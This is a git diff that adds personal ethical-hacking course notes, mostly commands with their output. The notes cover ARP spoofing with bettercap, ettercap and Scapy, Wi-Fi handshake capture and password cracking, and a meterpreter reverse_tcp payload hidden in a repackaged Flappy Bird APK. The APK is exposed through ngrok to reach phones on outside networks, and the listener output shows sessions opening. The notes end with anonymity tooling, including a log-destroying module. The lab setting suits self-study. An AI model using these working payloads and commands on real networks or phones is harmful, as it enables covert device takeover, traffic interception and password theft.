@@ -963,3 +963,304 @@ python -m http.server 8001
 - section not followed; however you can find this example code provided by the teacher of ZTM udemy classes in python project folder
 
 # Section 15 : Man in the middle
+- ARP packet
+  - request (ask mac address of X.X.X.X ip)
+  - reply (mac for X.X.X.X id ..:..:..:..)
+- man-in-the-middle : must answer before routeur or send response to routeur (I am ip X.X.X.X) (-> action arp-spoofing)
+
+## Bettercap arp-spoofing
+- run as root
+- install
+```
+┌──(root㉿kali)-[/home/kali]
+└─# apt-get install bettercap
+┌──(root㉿kali)-[/home/kali]
+└─# bettercap
+bettercap v2.32.0 (built for linux amd64 with go1.19) [type 'help' for a list of commands]
+
+192.168.1.0/24 > <kali ip>  » [09:19:11] [sys.log] [inf] gateway monitor started ...
+192.168.1.0/24 > <kali ip>  » help # list bettercap module
+192.168.1.0/24 > <kali ip>  » help <module>
+192.168.1.0/24 > <kali ip>  » <module> on # launch module
+192.168.1.0/24 > <kali ip>  » help arp.spoof
+192.168.1.0/24 > <kali ip>  » set arp.spoof.fullduplex true
+192.168.1.0/24 > <kali ip>  » set arp.spoof.targets <metasploitable ip>
+192.168.1.0/24 > <kali ip>  » help net.sniff
+192.168.1.0/24 > <kali ip>  » set net.sniff.local true
+192.168.1.0/24 > <kali ip>  » arp.spoof on
+
+```
+
+- create script sniff.cap :
+```
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets <metasploitable ip>
+set net.sniff.local true
+arp.spoof on
+net.sniff on
+```
+
+- run it : `bettercap -iface eth0 -caplet sniff.cap`
+
+## Ettercap psw sniffing
+- already installed on kali, use graphic interface
+- enable packet forwarding to not block target
+```
+┌──(root㉿kali)-[/home/kali]
+└─# cat /proc/sys/net/ipv4/ip_forward
+0                              
+┌──(root㉿kali)-[/home/kali]
+└─# echo 1 > /proc/sys/net/ipv4/ip_forward
+┌──(root㉿kali)-[/home/kali]
+└─# cat /proc/sys/net/ipv4/ip_forward     
+1
+```
+- scan for host, click on loop button, see list : click list button
+- start arp poisoning, click world button + start poisoning
+- print less data than bettercap
+- detect arp-spoof detection : exec on spoofed vm `arp -a`, if multiple ip have the same mac address, then an arp-spoof attack is in progress
+
+## Manual arp cache poisoning with Scapy lib
+- native on kali, open it in terminal `scapy`
+```
+┌──(root㉿kali)-[/home/kali]
+└─$ scapy 
+>>> ls(ARP)
+>>> ls(TCP)
+# get win10 test vm
+>>> ls(Ether)
+>>> broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
+>>> broadcast.show()
+arp_layer = ARP(pdst='<win10 vm ip>')
+arp_layer.show()
+entire_packet = broadcast/arp_layer
+entire_packet.show()
+answer = srp(entire_packet, timeout=2, verbose=True)[0]
+print(answer)
+print(answer[0])
+print(answer[0][1].hwsrc) #hwsrc = mac of target (win10 wm)
+target_mac_address = answer[0][1].hwsrc
+malicious_arp_packet = ARP(op=2, hwdst=target_mac_address, pdst='<win10 vm ip>', psrc='<routeur ip>')
+# pdst : dest of malicious_arp_packet
+# psrc : fake src of malicious_arp_packet (routeur ip)
+malicious_arp_packet.show()
+# before sending malicious_arp_packet, run on win10 machine arp -a to check current state of arp table
+send(malicious_arp_packet, verbose=False)
+# rerun arp -a on win10 vm : routeur now has the same mac than kali vm!!
+```
+
+# Wireless Cracking theory
+## prerequisite
+- wireless card with monitor mode + set it in monitor mode
+- be near a wifi access point
+- need to get channel number
+- understand 4-way hanshake protocol
+## steps
+1/ de-authentication package
+2/ all host try to reconnect back
+3/ intercept 4-way-handshake packet to get hashed psw
+4/ crack psw (can be done offline) with aircrack (cpu or gpu) or hashcat (both cpu & gpu)
+
+- get current wireless card mode : iwconfig
+- set it to monitor mode : ifconfig wlo1 down ; iwconfig wlo1 mode monitor/managed ; ifconfig wlo1 up
+- sometimes, no internet acces on monitor mode
+
+### steps 1+2+3
+```
+NAME
+       airmon-ng - POSIX sh script designed to turn wireless cards into monitor mode.
+```
+- list and kill process that uses wifi : airmon-ng check kill
+- start sniffing : airmon-ng check wlo1
+- start sniffing : `airmon-ng -c <channel number, example=6> --bssid <mac address of target accesspoint> -w <output_file> wlo1`
+- disconnect everyone from accesspoint (send disconnect package in infinite loop until ctrl-c) : `aireplay-ng -0 0 -a <mac address of acces point>` wlo1
+- stop sniffing as handshake packet have been exchanged, packet are stored in .cap file
+
+psw entropy = 18^62 = 6.7.10^77
+- 26 upercase letter
+- 26 lowercase letter
+- 10 digits
+- 18 char
+
+
+### step 4
+- list of most common password in France : https://github.com/tarraschk/richelieu
+#### Aircrack
+- find psw DB : `locate rockyou.txt`
+```
+┌──(kali㉿kali)-[~]
+└─$ ls -alh /usr/share/wordlists/rockyou.txt.gz
+-rw-r--r-- 1 root root 51M May 31 10:31 /usr/share/wordlists/rockyou.txt.gz
+```
+- unzip
+```
+aircrack-ng -w rockyou.txt <output_file>.cap
+```
+
+#### Hashcat
+- native on kali
+- `hascat --help` list options, including hashmodes
+`hashcat -a 0 -m 2500 <file>.hccapx <password file>`
+- -a : attack mode
+- -m : hash mode (example wpa)
+- need to convert .cap to .hccapx
+
+# Get accesss to android device
+## option 1 : setup android vm
+- use virtualbox
+- get android vm's vdi file : https://www.osboxes.org/android-x86/ untar file
+- chose "other linux 64bits" and use .vdi disk
+- display settings : may need to increase video memory and change graphics controller
+
+## option 2 : use regular android phone
+- create meterpreter payload :
+`msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4447 -o reverse_tcp.apk`
+
+- start web server :
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo service apache2 start
+[sudo] password for kali: 
+```
+- setup listener with msfconsole
+```
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.1.23
+set LPORT 4447
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.1.23:4447 
+[*] Sending stage (78179 bytes) to 192.168.1.10
+[*] Meterpreter session 1 opened (192.168.1.23:4447 -> 192.168.1.10:47787) at 2022-09-21 10:17:31 +0200
+
+```
+# Evil-droid
+- `git clone https://github.com/M4sc3r4n0/Evil-Droid`
+- cd Evil-Droid
+- chmod +x evil-droid
+- sudo ./evil-droid
+- select option 1 + option=android/meterpreter/reverse_tcp + multi-handler
+
+# obfuscate payload apk with legimitme apk (example : flappy bird game apk)
+- get flappy-bird apk : https://flappy-bird.en.uptodown.com/android
+```
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ sudo msfvenom -x flappy-bird-1-3-en-android.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=5555 -o flappybird.apk
+Using APK template: flappy-bird-1-3-en-android.apk
+[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+[-] No arch selected, selecting arch: dalvik from the payload
+Error: apksigner not found. If it's not in your PATH, please add it.
+```
+- install apksigner
+```
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ sudo apt-get install apksigner
+```
+- easiest way to solve PATH issues : re-install apktool `sudo apt-get remove apktool`
+- follow step for Linux [apk tool install](https://ibotpeaches.github.io/Apktool/install/) ; https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
+
+- install apk on android device + run listener on kali
+
+# Ngork : infect device on any external network
+```
+ngrok is the programmable network edge that adds connectivity, security, and observability to your apps with no code changes 
+```
+- create online account on https://ngrok.com/
+- download ngrok + install + setup
+- `./ngrok tcp 5555`
+```
+Hello World! https://ngrok.com/next-generation
+
+Session Status                online                                                                                                                                               
+Account                       jeanlefou (Plan: Free)                                                                                                 
+Version                       3.1.0                                                                   
+Region                        Europe (eu)                               
+Latency                       14ms                                                                                                                                                 
+Web Interface                 http://127.0.0.1:4040                                                                                                                                               
+Forwarding                    tcp://4.tcp.eu.ngrok.io:14047 -> localhost:5555                                                                                                                                                        Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                                                                                                  
+                              0       0       0.00    0.00    0.00    0.00         
+
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ host 4.tcp.eu.ngrok.io      
+4.tcp.eu.ngrok.io has address 18.198.77.177
+
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ msfvenom -p -x flappy-bird-1-3-en-android.apk -p android/meterpreter/reverse_tcp LHOST=18.198.77.177 LPORT=14047 -o flappybird.apk
+```
+- msfconsole, 1 diff : set LHOST 0.0.0.0 # -> listen on any interface
+
+it worked!
+```
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:5555 
+[*] Sending stage (78179 bytes) to 127.0.0.1
+[*] Meterpreter session 3 opened (127.0.0.1:5555 -> 127.0.0.1:41830) at 2022-09-21 12:27:38 +0200
+
+meterpreter > hostname
+[-] Unknown command: hostname
+meterpreter > help
+```
+
+# Section 18 : Introduction to anonymity
+- for personal use and for pentest use
+- example : fir scan, use vpn/tor browser/proxy
+
+## Tor browser
+- change ip address after X request/duration
+sudo apt update
+sudo apt-get install tor torbrowser-launcher #tor=service, torbrowser-launcher=browser
+torbrowser-launcher # on first run : get and install tor browser
+
+- to check if tor is running, access url : "http://check.torproject.org/"
+
+## proxychains with nmap
+- redirect nmap traffic to 3rd party entity
+service tor start
+service tor status
+sudo apt-get install proxychains
+sudo vim /etc/proxychains.conf
+# comment static_chain
+# uncomment
+# dynamic_chain
+# socks4 127.0.0.1 9050
+# socks5 127.0.0.1 9050
+proxychains firefox
+proxychains nmap nmap.org -F
+man proxychains
+```
+NAME
+       proxychains4 - redirect connections through proxy servers
+SYNOPSIS
+       proxychains4 --help
+       proxychains4 [ -f configfile.conf ] <program>
+DESCRIPTION
+       This program forces any tcp connection made by any given tcp client to follow through proxy (or proxy chain). It is a kind of proxifier.
+```
+
+## openvpn
+- sudo apt-get install openvpn
+- https://www.vpnbook.com/ / openvpn ; get a certificate bundle
+
+## WhoAmi anonymity tool
+- https://github.com/owerdogan/whoami-project
+
+```
+About the project
+In its simplest and shortest definition, Whoami is a user friendly privacy/anonymity tool with its ease of use and simple interface. Whoami uses 9+ different modules to ensure the highest possible level of anonymity also solves possible problems without disturbing you with the Bug fixer module, which is in development. You can find the descriptions of the modules below and more detailed information on the website.
+Finally, don't forget that there is never a hundred percent security on the internet!
+See the documentation section on the website for detailed information about modules
+
+Description
+Anti mitm 	Automatically bans the attacker when you come under a Man In The Middle attack
+Log killer 	Destroys the log files in system with the overwrite method
+IP changer 	Hides your real ip address by redirecting all network traffic to tor transparent proxy
+Dns change 	Replaces the default dns servers provided by your isp with privacy based servers
+Mac changer 	Replaces each network interface in the system with a fake mac address
+Anti cold boot 	Avoids ram dump by deleting traces in the system
+Timezone changer 	Sets the time in utc to avoid location leaks from the system clock
+Hostname changer 	Replaces the host name with a random name to hide it
+Browser anonymization 	Configures the browser to be privacy focused
+```
